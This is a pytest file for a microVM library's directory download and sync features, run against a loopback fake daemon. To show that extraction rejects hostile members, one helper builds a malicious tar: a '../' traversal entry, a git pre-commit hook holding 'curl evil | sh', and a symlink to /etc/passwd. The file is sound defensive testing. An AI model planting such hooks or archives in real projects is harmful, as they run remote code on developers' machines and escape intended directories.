# SPDX-License-Identifier: Apache-2.0
"""`Session.download_dir` and `Session.sync_dir`: directory transfer through core (#260).

Both are core's `microvms_core::workspace`. What's asserted here is what a Python caller sees:
an archive from the VM writes only the regular files the globs select, and a second sync
after one edit uploads that member alone. The loopback daemon below answers the file and tar
routes by path and keeps the manifest a sync writes, so a second pass reads it back.
"""

from __future__ import annotations

import http.server
import io
import socketserver
import tarfile
import threading
from collections.abc import Iterator
from pathlib import Path
from urllib.parse import parse_qs, urlparse

import pytest

import microvms

MANIFEST = "/workspace/.microvm-sync-manifest.json"


class FilesDaemon:
    """A daemon's fs routes: `GET /v1/fs/tar` answers `archive`, and the manifest round trips.

    `uploads` records each `PUT /v1/fs/tar` body, and `requested` each request line.
    """

    def __init__(self, archive: bytes = b"") -> None:
        self.archive = archive
        self.manifest: bytes | None = None
        self.uploads: list[bytes] = []
        self.requested: list[str] = []
        daemon = self

        class Handler(http.server.BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def do_GET(self) -> None:
                self.answer()

            def do_PUT(self) -> None:
                self.answer()

            def do_POST(self) -> None:
                self.answer()

            def reply(self, status: int, body: bytes) -> None:
                self.send_response(status)
                self.send_header("content-type", "application/octet-stream")
                self.send_header("content-length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                self.wfile.flush()

            def answer(self) -> None:
                length = int(self.headers.get("content-length") or 0)
                body = self.rfile.read(length) if length else b""
                daemon.requested.append(f"{self.command} {self.path}")
                url = urlparse(self.path)
                path = parse_qs(url.query).get("path", [""])[0]
                if url.path == "/v1/fs/tar" and self.command == "GET":
                    self.reply(200, daemon.archive)
                elif url.path == "/v1/fs/tar":
                    daemon.uploads.append(body)
                    self.reply(200, b"")
                elif url.path == "/v1/fs/file" and path == MANIFEST:
                    if self.command == "PUT":
                        daemon.manifest = body
                        self.reply(200, b"")
                    elif daemon.manifest is None:
                        self.reply(404, b"no such file")
                    else:
                        self.reply(200, daemon.manifest)
                else:
                    self.reply(404, b"not scripted")

            def log_message(self, *args: object) -> None:
                """Silent: a passing test should print nothing."""

        self._server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        self._server.daemon_threads = True
        self._thread = threading.Thread(
            target=self._server.serve_forever, args=(0.01,), daemon=True
        )
        self._thread.start()

    @property
    def endpoint(self) -> str:
        return f"http://127.0.0.1:{self._server.server_address[1]}"

    def close(self) -> None:
        self._server.shutdown()
        self._server.server_close()


@pytest.fixture
def files_daemon() -> Iterator[type[FilesDaemon]]:
    built: list[FilesDaemon] = []

    def factory(archive: bytes = b"") -> FilesDaemon:
        daemon = FilesDaemon(archive)
        built.append(daemon)
        return daemon

    yield factory  # type: ignore[misc]
    for daemon in built:
        daemon.close()


def hostile_archive() -> bytes:
    """A tree as a compromised VM might pack it: a traversal, a git hook, a link, one real file."""
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as archive:
        for name, data in [
            ("../escape", b"outside"),
            (".git/hooks/pre-commit", b"#!/bin/sh\ncurl evil | sh\n"),
            ("dist/app.txt", b"real"),
        ]:
            member = tarfile.TarInfo(name)
            member.size = len(data)
            archive.addfile(member, io.BytesIO(data))
        link = tarfile.TarInfo("dist/link")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/passwd"
        archive.addfile(link)
    return buffer.getvalue()


def members(archive: bytes) -> list[str]:
    with tarfile.open(fileobj=io.BytesIO(archive)) as opened:
        return sorted(member.name for member in opened.getmembers())


def test_download_dir_writes_only_the_selected_regular_files(
    files_daemon: object, tmp_path: Path
) -> None:
    """A `../` member, a `.git` hook and a symlink write nothing; the one regular file lands.

    `["**"]` selects everything, so what keeps the three out is core's extraction: regular files
    only, never under `.git`, never outside the destination. A hook written here would run on
    the host at the caller's next commit.

    **Falsification**: drop the `.git` component check from core's extraction
    (`crates/microvms-edges/src/workspace.rs`) and the hook lands on disk.
    """
    daemon = files_daemon(hostile_archive())  # type: ignore[operator]
    local = tmp_path / "out"
    local.mkdir()
    session = microvms.Session.direct(daemon.endpoint, "agent-token")

    written = session.download_dir("/workspace/build", local, ["**"])

    assert [(file.path, file.size) for file in written] == [("dist/app.txt", 4)]
    assert (local / "dist" / "app.txt").read_bytes() == b"real"
    assert not (local / ".git").exists(), "a git hook was written on the host"
    assert not (local / "dist" / "link").exists(), "a symlink was written"
    assert not (tmp_path / "escape").exists(), "a member escaped the destination"
    assert daemon.requested == ["GET /v1/fs/tar?path=%2Fworkspace%2Fbuild"]


def test_download_dir_writes_only_what_the_globs_select(
    files_daemon: object, tmp_path: Path
) -> None:
    daemon = files_daemon(hostile_archive())  # type: ignore[operator]
    session = microvms.Session.direct(daemon.endpoint, "agent-token")
    assert session.download_dir("/workspace", tmp_path, ["*.log"]) == []
    assert list(tmp_path.iterdir()) == []


def test_a_second_sync_after_one_edit_uploads_that_member_and_deletes_nothing(
    files_daemon: object, tmp_path: Path
) -> None:
    """The incremental bet: an archive proportional to the edit, and no deletion for it."""
    daemon = files_daemon()  # type: ignore[operator]
    (tmp_path / "a.txt").write_text("one")
    (tmp_path / "b.txt").write_text("two")
    session = microvms.Session.direct(daemon.endpoint, "agent-token")

    first = session.sync_dir(tmp_path)
    assert first.full, "no manifest in the VM yet, so everything travels"
    assert first.uploaded_members == 2
    assert daemon.manifest is not None, "the sync wrote the VM's manifest"

    (tmp_path / "a.txt").write_text("edited")
    second = session.sync_dir(tmp_path)

    assert not second.full
    assert (second.uploaded_members, second.deleted) == (1, 0)
    assert members(daemon.uploads[1]) == ["a.txt"]

    unchanged = session.sync_dir(tmp_path)
    assert unchanged.unchanged
    assert len(daemon.uploads) == 2, "an unchanged tree sent an archive"


def test_sync_dir_full_ignores_the_manifest(
    files_daemon: object, tmp_path: Path
) -> None:
    daemon = files_daemon()  # type: ignore[operator]
    (tmp_path / "a.txt").write_text("one")
    session = microvms.Session.direct(daemon.endpoint, "agent-token")
    session.sync_dir(tmp_path)

    again = session.sync_dir(tmp_path, full=True)
    assert again.full and again.uploaded_members == 1
    assert not any("GET /v1/fs/file" in line for line in daemon.requested[3:])


def test_a_local_tree_that_cannot_be_read_is_an_invalid_arg(
    files_daemon: object, tmp_path: Path
) -> None:
    daemon = files_daemon()  # type: ignore[operator]
    session = microvms.Session.direct(daemon.endpoint, "agent-token")
    with pytest.raises(microvms.InvalidArgError):
        session.sync_dir(tmp_path / "absent", full=True)
    assert daemon.requested == [], "a local failure cost a request"
